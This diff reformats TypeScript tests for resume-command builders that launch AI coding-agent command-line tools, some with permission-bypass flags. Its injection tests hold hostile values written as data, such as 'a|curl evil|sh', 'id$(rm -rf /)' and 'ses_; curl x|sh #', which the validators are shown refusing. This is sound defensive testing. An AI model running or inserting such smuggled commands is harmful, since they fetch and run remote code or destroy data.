@@ -21,20 +21,27 @@ import {
 } from "./resumeCommand.js";
 
 function tmpDir(prefix: string): string {
-  return path.join(os.tmpdir(), `${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
+  return path.join(
+    os.tmpdir(),
+    `${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+  );
 }
 
 const trash: string[] = [];
 afterEach(() => {
   while (trash.length) {
     const p = trash.pop()!;
-    try { fs.rmSync(p, { recursive: true, force: true }); } catch {}
+    try {
+      fs.rmSync(p, { recursive: true, force: true });
+    } catch {}
   }
 });
 
 describe("CLAUDE_UUID_RE", () => {
   test("matches v4 UUIDs", () => {
-    expect(CLAUDE_UUID_RE.test("550e8400-e29b-41d4-a716-446655440000")).toBe(true);
+    expect(CLAUDE_UUID_RE.test("550e8400-e29b-41d4-a716-446655440000")).toBe(
+      true,
+    );
   });
   test("rejects subagent nanoid-style IDs", () => {
     expect(CLAUDE_UUID_RE.test("agent-abcdef1234")).toBe(false);
@@ -44,31 +51,53 @@ describe("CLAUDE_UUID_RE", () => {
 
 describe("combineClaudeResumeFlags", () => {
   test("appends permission flag when absent", () => {
-    expect(combineClaudeResumeFlags("", "--permission-mode bypassPermissions"))
-      .toBe("--permission-mode bypassPermissions");
-    expect(combineClaudeResumeFlags("--verbose", "--permission-mode bypassPermissions"))
-      .toBe("--verbose --permission-mode bypassPermissions");
+    expect(
+      combineClaudeResumeFlags("", "--permission-mode bypassPermissions"),
+    ).toBe("--permission-mode bypassPermissions");
+    expect(
+      combineClaudeResumeFlags(
+        "--verbose",
+        "--permission-mode bypassPermissions",
+      ),
+    ).toBe("--verbose --permission-mode bypassPermissions");
   });
 
   test("skips permission flag when any equivalent is already present", () => {
-    expect(combineClaudeResumeFlags("--dangerously-skip-permissions", "--permission-mode bypassPermissions"))
-      .toBe("--dangerously-skip-permissions");
-    expect(combineClaudeResumeFlags("--allow-dangerously-skip-permissions", "--permission-mode bypassPermissions"))
-      .toBe("--allow-dangerously-skip-permissions");
-    expect(combineClaudeResumeFlags("--permission-mode default", "--permission-mode bypassPermissions"))
-      .toBe("--permission-mode default");
+    expect(
+      combineClaudeResumeFlags(
+        "--dangerously-skip-permissions",
+        "--permission-mode bypassPermissions",
+      ),
+    ).toBe("--dangerously-skip-permissions");
+    expect(
+      combineClaudeResumeFlags(
+        "--allow-dangerously-skip-permissions",
+        "--permission-mode bypassPermissions",
+      ),
+    ).toBe("--allow-dangerously-skip-permissions");
+    expect(
+      combineClaudeResumeFlags(
+        "--permission-mode default",
+        "--permission-mode bypassPermissions",
+      ),
+    ).toBe("--permission-mode default");
   });
 
   test("jsonlBypass forces --dangerously-skip-permissions before permFlags resolve", () => {
-    const result = combineClaudeResumeFlags("--verbose", "--permission-mode bypassPermissions", true);
+    const result = combineClaudeResumeFlags(
+      "--verbose",
+      "--permission-mode bypassPermissions",
+      true,
+    );
     expect(result).toContain("--dangerously-skip-permissions");
     // permFlags shouldn't double-add since hasClaudePermissionFlag is now true
     expect(result).not.toContain("--permission-mode bypassPermissions");
   });
 
   test("handles null/undefined base args", () => {
-    expect(combineClaudeResumeFlags(null, "--allow-dangerously-skip-permissions"))
-      .toBe("--allow-dangerously-skip-permissions");
+    expect(
+      combineClaudeResumeFlags(null, "--allow-dangerously-skip-permissions"),
+    ).toBe("--allow-dangerously-skip-permissions");
     expect(combineClaudeResumeFlags(undefined, null)).toBe("");
   });
 });
@@ -87,7 +116,9 @@ describe("extractJsonlPermissionMode", () => {
   });
 
   test("returns undefined on malformed JSON", () => {
-    expect(extractJsonlPermissionMode('{"type":"user", broken')).toBeUndefined();
+    expect(
+      extractJsonlPermissionMode('{"type":"user", broken'),
+    ).toBeUndefined();
   });
 });
 
@@ -98,7 +129,10 @@ describe("rewriteSubagentJsonlToUuid", () => {
     trash.push(dir);
 
     const uuid = "550e8400-e29b-41d4-a716-446655440000";
-    const result = rewriteSubagentJsonlToUuid(uuid, path.join(dir, `${uuid}.jsonl`));
+    const result = rewriteSubagentJsonlToUuid(
+      uuid,
+      path.join(dir, `${uuid}.jsonl`),
+    );
     expect(result).toEqual({ resumeId: uuid, rewrote: false });
   });
 
@@ -107,7 +141,10 @@ describe("rewriteSubagentJsonlToUuid", () => {
     fs.mkdirSync(dir, { recursive: true });
     trash.push(dir);
 
-    const result = rewriteSubagentJsonlToUuid("subagent-xyz", path.join(dir, "subagent-xyz.jsonl"));
+    const result = rewriteSubagentJsonlToUuid(
+      "subagent-xyz",
+      path.join(dir, "subagent-xyz.jsonl"),
+    );
     expect(result.rewrote).toBe(false);
     expect(result.resumeId).toBe("subagent-xyz");
   });
@@ -219,7 +256,9 @@ describe("copyJsonlAsSession", () => {
     const dir = tmpDir("fork-copy");
     fs.mkdirSync(dir, { recursive: true });
     trash.push(dir);
-    expect(copyJsonlAsSession(path.join(dir, "missing.jsonl"), PARENT, FORK)).toBeNull();
+    expect(
+      copyJsonlAsSession(path.join(dir, "missing.jsonl"), PARENT, FORK),
+    ).toBeNull();
   });
 });
 
@@ -236,23 +275,36 @@ describe("buildNonClaudeResumeCommand", () => {
   });
 
   test("claude returns null so the caller runs the repair machinery inline", () => {
-    expect(buildNonClaudeResumeCommand("claude", "550e8400-e29b-41d4-a716-446655440000")).toBeNull();
+    expect(
+      buildNonClaudeResumeCommand(
+        "claude",
+        "550e8400-e29b-41d4-a716-446655440000",
+      ),
+    ).toBeNull();
   });
 
   test("gemini resumes the latest chat", () => {
-    expect(buildNonClaudeResumeCommand("gemini", "ignored")).toBe("gemini --resume latest");
+    expect(buildNonClaudeResumeCommand("gemini", "ignored")).toBe(
+      "gemini --resume latest",
+    );
   });
 
   test("codex resume is unchanged, appending combined args + permission flags", () => {
-    expect(buildNonClaudeResumeCommand("codex", "sess1")).toBe("codex resume sess1");
+    expect(buildNonClaudeResumeCommand("codex", "sess1")).toBe(
+      "codex resume sess1",
+    );
     expect(
       buildNonClaudeResumeCommand("codex", "sess1", {
         args: "--full-auto",
         permFlags: "--dangerously-bypass-approvals-and-sandbox",
       }),
-    ).toBe("codex resume sess1 --full-auto --dangerously-bypass-approvals-and-sandbox");
+    ).toBe(
+      "codex resume sess1 --full-auto --dangerously-bypass-approvals-and-sandbox",
+    );
     expect(
-      buildNonClaudeResumeCommand("codex", "sess1", { permFlags: "--full-auto" }),
+      buildNonClaudeResumeCommand("codex", "sess1", {
+        permFlags: "--full-auto",
+      }),
     ).toBe("codex resume sess1 --full-auto");
   });
 
@@ -266,8 +318,7 @@ describe("buildNonClaudeResumeCommand", () => {
 
   test("muse resumes by UUID via the registry resumeCmd (never claude, never a name)", () => {
     const id = "01a04000-4d49-70f3-88b4-316e8f48a5fb";
-    const cmd = buildNonClaudeResumeCommand("muse", id, {
-    });
+    const cmd = buildNonClaudeResumeCommand("muse", id, {});
     expect(cmd).toBe(`muse resume ${id}`);
     expect(cmd).not.toContain("claude");
     expect(cmd).not.toContain("--full-auto");
@@ -285,7 +336,9 @@ describe("buildNonClaudeResumeCommand", () => {
       }),
     ).toBe(`muse resume ${id} --reasoning-effort high --disable-approval`);
     expect(
-      buildNonClaudeResumeCommand("muse", id, { permFlags: "--disable-approval" }),
+      buildNonClaudeResumeCommand("muse", id, {
+        permFlags: "--disable-approval",
+      }),
     ).toBe(`muse resume ${id} --disable-approval`);
   });
 
@@ -299,9 +352,13 @@ describe("buildNonClaudeResumeCommand", () => {
         args: "--reasoning-effort high",
         permFlags: "--permission-mode bypassPermissions",
       }),
-    ).toBe(`grok --resume ${id} --reasoning-effort high --permission-mode bypassPermissions`);
+    ).toBe(
+      `grok --resume ${id} --reasoning-effort high --permission-mode bypassPermissions`,
+    );
     expect(
-      buildNonClaudeResumeCommand("grok", id, { permFlags: "--permission-mode bypassPermissions" }),
+      buildNonClaudeResumeCommand("grok", id, {
+        permFlags: "--permission-mode bypassPermissions",
+      }),
     ).toBe(`grok --resume ${id} --permission-mode bypassPermissions`);
   });
 });
@@ -319,7 +376,15 @@ describe("isReconstitutionTarget", () => {
   });
 
   test("rejects clients with no local reconstitution generator", () => {
-    for (const a of ["gemini", "cursor", "opencode", "pi", "grok", "claude_code", "bogus"]) {
+    for (const a of [
+      "gemini",
+      "cursor",
+      "opencode",
+      "pi",
+      "grok",
+      "claude_code",
+      "bogus",
+    ]) {
       expect(isReconstitutionTarget(a)).toBe(false);
     }
   });
@@ -347,7 +412,17 @@ describe("resumeTmuxPrefix", () => {
 // keeps a 7th client covered automatically.
 describe("MANAGED_TMUX_PREFIXES / isManagedTmuxName", () => {
   test("covers every client prefix plus the non-client task prefix ct-", () => {
-    for (const p of ["cc-", "cx-", "cu-", "gm-", "oc-", "pi-", "gk-", "ms-", "ct-"]) {
+    for (const p of [
+      "cc-",
+      "cx-",
+      "cu-",
+      "gm-",
+      "oc-",
+      "pi-",
+      "gk-",
+      "ms-",
+      "ct-",
+    ]) {
       expect(MANAGED_TMUX_PREFIXES).toContain(p);
     }
   });
@@ -438,10 +513,16 @@ describe("cursor resume dispatch end to end", () => {
     expect(agentType).toBe("cursor");
     // cursor's approval mode rides the command line, so a resume carries the
     // launch's --force (a managed pane cannot answer "Run this command?").
-    const cmd = buildNonClaudeResumeCommand(agentType, sessionId, { permFlags: "--force" });
+    const cmd = buildNonClaudeResumeCommand(agentType, sessionId, {
+      permFlags: "--force",
+    });
     expect(cmd).toBe(`cursor-agent --resume ${sessionId} --force`);
     expect(cmd).not.toContain("claude");
-    expect(buildNonClaudeResumeCommand("gemini", sessionId, { permFlags: "--force" })).not.toContain("--force");
+    expect(
+      buildNonClaudeResumeCommand("gemini", sessionId, {
+        permFlags: "--force",
+      }),
+    ).not.toContain("--force");
     expect(resumeTmuxPrefix(agentType)).toBe("cu");
   });
 });
@@ -453,7 +534,7 @@ describe("cursor resume dispatch end to end", () => {
 // SYNTHETIC.
 describe("isValidResumeSessionId — shell-injection ids are refused before command construction", () => {
   const INJECTION_IDS = [
-    "x; touch /tmp/pwned #",   // the exact pi filename-fallback poison from the finding
+    "x; touch /tmp/pwned #", // the exact pi filename-fallback poison from the finding
     "id`whoami`",
     "id$(rm -rf /)",
     "a|curl evil|sh",
@@ -463,7 +544,14 @@ describe("isValidResumeSessionId — shell-injection ids are refused before comm
   ];
 
   test("claude / codex / cursor / pi / grok / muse refuse every injection payload (id is interpolated)", () => {
-    for (const agent of ["claude", "codex", "cursor", "pi", "grok", "muse"] as const) {
+    for (const agent of [
+      "claude",
+      "codex",
+      "cursor",
+      "pi",
+      "grok",
+      "muse",
+    ] as const) {
       for (const bad of INJECTION_IDS) {
         expect(isValidResumeSessionId(agent, bad)).toBe(false);
       }
@@ -473,31 +561,57 @@ describe("isValidResumeSessionId — shell-injection ids are refused before comm
   test("muse requires an exact UUID — names could resume a different session", () => {
     // `muse resume <session-ref>` matches Session Names, so only the one real
     // shape may reach the command (same rule as grok).
-    expect(isValidResumeSessionId("muse", "01a04000-4d49-70f3-88b4-316e8f48a5fb")).toBe(true);
+    expect(
+      isValidResumeSessionId("muse", "01a04000-4d49-70f3-88b4-316e8f48a5fb"),
+    ).toBe(true);
     expect(isValidResumeSessionId("muse", "my session name")).toBe(false);
     expect(isValidResumeSessionId("muse", "--last")).toBe(false);
   });
 
   test("opencode requires its exact ses_<base62> shape, not just a ses_ prefix", () => {
     // Real id observed in a live opencode.db.
-    expect(OPENCODE_SESSION_ID_RE.test("ses_08f9926d3ffelzGS3Q3CteaeUk")).toBe(true);
-    expect(isValidResumeSessionId("opencode", "ses_08f9926d3ffelzGS3Q3CteaeUk")).toBe(true);
+    expect(OPENCODE_SESSION_ID_RE.test("ses_08f9926d3ffelzGS3Q3CteaeUk")).toBe(
+      true,
+    );
+    expect(
+      isValidResumeSessionId("opencode", "ses_08f9926d3ffelzGS3Q3CteaeUk"),
+    ).toBe(true);
     // A spoofed SQLite row that merely STARTS WITH ses_ (the finding's example).
     expect(isValidResumeSessionId("opencode", "ses_; curl x|sh #")).toBe(false);
-    expect(isValidResumeSessionId("opencode", "ses_has_underscore")).toBe(false);
+    expect(isValidResumeSessionId("opencode", "ses_has_underscore")).toBe(
+      false,
+    );
     expect(isValidResumeSessionId("opencode", "notses_abc")).toBe(false);
-    expect(isValidResumeSessionId("opencode", "550e8400-e29b-41d4-a716-446655440000")).toBe(false);
+    expect(
+      isValidResumeSessionId(
+        "opencode",
+        "550e8400-e29b-41d4-a716-446655440000",
+      ),
+    ).toBe(false);
   });
 
   test("every real client id still passes byte-identically (no valid resume broken)", () => {
-    expect(isValidResumeSessionId("claude", "550e8400-e29b-41d4-a716-446655440000")).toBe(true);
+    expect(
+      isValidResumeSessionId("claude", "550e8400-e29b-41d4-a716-446655440000"),
+    ).toBe(true);
     expect(isValidResumeSessionId("claude", "agent-abcdef1234")).toBe(true);
-    expect(isValidResumeSessionId("claude", "forked-agent-abc-550e8400-e29b-41d4-a716-446655440000")).toBe(true);
-    expect(isValidResumeSessionId("codex", "12345678-1234-1234-1234-123456789abc")).toBe(true);
+    expect(
+      isValidResumeSessionId(
+        "claude",
+        "forked-agent-abc-550e8400-e29b-41d4-a716-446655440000",
+      ),
+    ).toBe(true);
+    expect(
+      isValidResumeSessionId("codex", "12345678-1234-1234-1234-123456789abc"),
+    ).toBe(true);
     expect(isValidResumeSessionId("cursor", "chat-abc123")).toBe(true);
-    expect(isValidResumeSessionId("pi", "a7c9c0e2-1d82-4d42-b342-f59fefc7b9f5")).toBe(true);
+    expect(
+      isValidResumeSessionId("pi", "a7c9c0e2-1d82-4d42-b342-f59fefc7b9f5"),
+    ).toBe(true);
     // grok ids are UUIDs (v7-style observed live).
-    expect(isValidResumeSessionId("grok", "01a04000-4d49-70f3-88b4-316e8f48a5fb")).toBe(true);
+    expect(
+      isValidResumeSessionId("grok", "01a04000-4d49-70f3-88b4-316e8f48a5fb"),
+    ).toBe(true);
   });
 
   test("grok refuses a title-shaped id: `grok --resume <non-UUID>` matches session TITLES", () => {
@@ -505,7 +619,9 @@ describe("isValidResumeSessionId — shell-injection ids are refused before comm
     // title match and silently resume a DIFFERENT session on a unique hit.
     expect(isValidResumeSessionId("grok", "fix-auth")).toBe(false);
     expect(isValidResumeSessionId("grok", "mysession")).toBe(false);
-    expect(isValidResumeSessionId("grok", "01a04000-4d49-70f3-88b4")).toBe(false);
+    expect(isValidResumeSessionId("grok", "01a04000-4d49-70f3-88b4")).toBe(
+      false,
+    );
   });
 
   test("gemini is exempt — its resume ignores the id (`gemini --resume latest`)", () => {
@@ -523,42 +639,97 @@ describe("isValidResumeSessionId — shell-injection ids are refused before comm
     // refused id never reaches construction; a valid one builds the real command.
     const good = "ses_08f9926d3ffelzGS3Q3CteaeUk";
     expect(isValidResumeSessionId("opencode", good)).toBe(true);
-    expect(buildNonClaudeResumeCommand("opencode", good)).toBe(`opencode -s ${good}`);
+    expect(buildNonClaudeResumeCommand("opencode", good)).toBe(
+      `opencode -s ${good}`,
+    );
   });
 });
 
 describe("isWorkflowAgentTranscriptPath", () => {
-  const host = "/Users/x/.claude/projects/-Users-x-src-app/25bfc496-56e9-468f-bd51-cdd59bc6b9d3";
+  const host =
+    "/Users/x/.claude/projects/-Users-x-src-app/25bfc496-56e9-468f-bd51-cdd59bc6b9d3";
 
   test("a Workflow-tool agent transcript, by agent id or by uuid copy", () => {
-    expect(isWorkflowAgentTranscriptPath(`${host}/subagents/workflows/wf_46053253-162/agent-a9b83caedab77a376.jsonl`)).toBe(true);
-    expect(isWorkflowAgentTranscriptPath(`${host}/subagents/workflows/wf_46053253-162/89b2bd61-7fdc-4491-89fc-7e64dbe39844.jsonl`)).toBe(true);
+    expect(
+      isWorkflowAgentTranscriptPath(
+        `${host}/subagents/workflows/wf_46053253-162/agent-a9b83caedab77a376.jsonl`,
+      ),
+    ).toBe(true);
+    expect(
+      isWorkflowAgentTranscriptPath(
+        `${host}/subagents/workflows/wf_46053253-162/89b2bd61-7fdc-4491-89fc-7e64dbe39844.jsonl`,
+      ),
+    ).toBe(true);
   });
 
   test("an Agent-tool subagent or a top-level transcript is not", () => {
-    expect(isWorkflowAgentTranscriptPath(`${host}/subagents/agent-a9b83caedab77a376.jsonl`)).toBe(false);
-    expect(isWorkflowAgentTranscriptPath(`${host}/subagents/4abdf051-4c98-40f0-ad26-666ba8a229c5.jsonl`)).toBe(false);
-    expect(isWorkflowAgentTranscriptPath(`/Users/x/.claude/projects/-Users-x-src-app/25bfc496-56e9-468f-bd51-cdd59bc6b9d3.jsonl`)).toBe(false);
+    expect(
+      isWorkflowAgentTranscriptPath(
+        `${host}/subagents/agent-a9b83caedab77a376.jsonl`,
+      ),
+    ).toBe(false);
+    expect(
+      isWorkflowAgentTranscriptPath(
+        `${host}/subagents/4abdf051-4c98-40f0-ad26-666ba8a229c5.jsonl`,
+      ),
+    ).toBe(false);
+    expect(
+      isWorkflowAgentTranscriptPath(
+        `/Users/x/.claude/projects/-Users-x-src-app/25bfc496-56e9-468f-bd51-cdd59bc6b9d3.jsonl`,
+      ),
+    ).toBe(false);
     // the run directory itself, or a journal beside the agents, is not an agent transcript path shape we resume
-    expect(isWorkflowAgentTranscriptPath(`${host}/subagents/workflows/wf_46053253-162`)).toBe(false);
+    expect(
+      isWorkflowAgentTranscriptPath(
+        `${host}/subagents/workflows/wf_46053253-162`,
+      ),
+    ).toBe(false);
   });
 });
 
 describe("model choices on native resume", () => {
   test.each([
-    ["codex", "gpt-6-astra", "high", "-m gpt-6-astra", "model_reasoning_effort=high"],
-    ["opencode", "anthropic/claude-sonnet-5", undefined, "-m anthropic/claude-sonnet-5", undefined],
-    ["pi", "openai/gpt-5.4", "high", "--model openai/gpt-5.4", "--thinking high"],
+    [
+      "codex",
+      "gpt-6-astra",
+      "high",
+      "-m gpt-6-astra",
+      "model_reasoning_effort=high",
+    ],
+    [
+      "opencode",
+      "anthropic/claude-sonnet-5",
+      undefined,
+      "-m anthropic/claude-sonnet-5",
+      undefined,
+    ],
+    [
+      "pi",
+      "openai/gpt-5.4",
+      "high",
+      "--model openai/gpt-5.4",
+      "--thinking high",
+    ],
     ["grok", "grok-4.6", "high", "-m grok-4.6", "--reasoning-effort high"],
-  ])("preserves history and applies %s model flags", (agent, model, effort, flag, effortFlag) => {
-    const command = buildNonClaudeResumeCommand(agent as any, "session123", { model, effort });
-    expect(command).toContain("session123");
-    expect(command).toContain(flag!);
-    if (effortFlag) expect(command).toContain(effortFlag);
-  });
+  ])(
+    "preserves history and applies %s model flags",
+    (agent, model, effort, flag, effortFlag) => {
+      const command = buildNonClaudeResumeCommand(agent as any, "session123", {
+        model,
+        effort,
+      });
+      expect(command).toContain("session123");
+      expect(command).toContain(flag!);
+      if (effortFlag) expect(command).toContain(effortFlag);
+    },
+  );
 
   test("does not interpolate an unknown model into the shell", () => {
-    expect(buildNonClaudeResumeCommand("pi", "session123", { model: "openai/gpt;touch /tmp/injected" })).toBe("pi --session session123");
+    expect(
+      buildNonClaudeResumeCommand("pi", "session123", {
+        model: "openai/gpt;touch /tmp/injected",
+      }),
+    ).toBe("pi --session session123");
   });
 });
 
@@ -570,9 +741,9 @@ describe("buildNonClaudeResumeCommand native fork", () => {
   const child = "e1d4009c-ee25-4e8e-9090-5671b3a134e6";
 
   test("grok forks through --resume <parent> --fork-session --session-id <child>", () => {
-    expect(buildNonClaudeResumeCommand("grok", child, { forkFromSessionId: parent })).toBe(
-      `grok --resume ${parent} --fork-session --session-id ${child}`,
-    );
+    expect(
+      buildNonClaudeResumeCommand("grok", child, { forkFromSessionId: parent }),
+    ).toBe(`grok --resume ${parent} --fork-session --session-id ${child}`);
   });
 
   test("grok fork keeps the resume flag tail (args + permission mode)", () => {
@@ -582,12 +753,20 @@ describe("buildNonClaudeResumeCommand native fork", () => {
         args: "--fullscreen",
         permFlags: "--permission-mode bypassPermissions",
       }),
-    ).toBe(`grok --resume ${parent} --fork-session --session-id ${child} --fullscreen --permission-mode bypassPermissions`);
+    ).toBe(
+      `grok --resume ${parent} --fork-session --session-id ${child} --fullscreen --permission-mode bypassPermissions`,
+    );
   });
 
   test("a client without forkCmd refuses a native fork instead of resuming the parent", () => {
-    expect(() => buildNonClaudeResumeCommand("pi", child, { forkFromSessionId: parent })).toThrow(/native fork/);
-    expect(() => buildNonClaudeResumeCommand("codex", child, { forkFromSessionId: parent })).toThrow(/native fork/);
+    expect(() =>
+      buildNonClaudeResumeCommand("pi", child, { forkFromSessionId: parent }),
+    ).toThrow(/native fork/);
+    expect(() =>
+      buildNonClaudeResumeCommand("codex", child, {
+        forkFromSessionId: parent,
+      }),
+    ).toThrow(/native fork/);
   });
 });
 
@@ -595,17 +774,33 @@ describe("buildNonClaudeResumeCommand native fork", () => {
 // file: the text never enters argv, and the path must be shell-safe.
 describe("grok stable rules fragment", () => {
   test("appends --rules with a cat substitution of the feed file", () => {
-    expect(grokStableRulesFragment("/Users/me/.codecast/stable-rules/conv_1.md")).toBe(' --rules "$(cat /Users/me/.codecast/stable-rules/conv_1.md)"');
+    expect(
+      grokStableRulesFragment("/Users/me/.codecast/stable-rules/conv_1.md"),
+    ).toBe(' --rules "$(cat /Users/me/.codecast/stable-rules/conv_1.md)"');
     expect(grokStableRulesFragment(undefined)).toBe("");
   });
   test("refuses a path that could break out of the substitution", () => {
-    expect(() => grokStableRulesFragment("/tmp/x); rm -rf ~ #.md")).toThrow(/shell-safe/);
-    expect(() => grokStableRulesFragment("/tmp/with space.md")).toThrow(/shell-safe/);
+    expect(() => grokStableRulesFragment("/tmp/x); rm -rf ~ #.md")).toThrow(
+      /shell-safe/,
+    );
+    expect(() => grokStableRulesFragment("/tmp/with space.md")).toThrow(
+      /shell-safe/,
+    );
   });
   test("a grok resume carries the fragment after the permission flags; other clients never do", () => {
     const id = "01a04000-4d49-70f3-88b4-316e8f48a5fb";
-    expect(buildNonClaudeResumeCommand("grok", id, { permFlags: "--permission-mode bypassPermissions", stableRulesFile: "/tmp/feed.md" }))
-      .toBe(`grok --resume ${id} --permission-mode bypassPermissions --rules "$(cat /tmp/feed.md)"`);
-    expect(buildNonClaudeResumeCommand("pi", id, { stableRulesFile: "/tmp/feed.md" })).toBe(`pi --session ${id}`);
+    expect(
+      buildNonClaudeResumeCommand("grok", id, {
+        permFlags: "--permission-mode bypassPermissions",
+        stableRulesFile: "/tmp/feed.md",
+      }),
+    ).toBe(
+      `grok --resume ${id} --permission-mode bypassPermissions --rules "$(cat /tmp/feed.md)"`,
+    );
+    expect(
+      buildNonClaudeResumeCommand("pi", id, {
+        stableRulesFile: "/tmp/feed.md",
+      }),
+    ).toBe(`pi --session ${id}`);
   });
 });
